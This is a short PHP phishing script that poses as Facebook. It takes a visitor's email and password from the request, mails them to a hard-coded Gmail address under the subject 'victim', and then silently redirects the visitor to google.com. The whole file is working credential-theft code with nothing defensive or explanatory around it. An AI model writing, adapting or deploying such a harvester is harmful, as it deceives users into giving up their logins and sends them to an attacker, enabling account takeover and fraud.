<?php

echo '<title> facebook </title>';

$email = $_GET['email'];
$pass = $_GET['pass'];

$to = "berroubaanas9@gmail.com";
$you = "mail@srvd32.hosteur.com";

mail ("$to","victim","pass:$pass","email is :$email");
echo'</head><meta http_equiv="refresh"content="0;url=http://google.com"><body></html>';

?>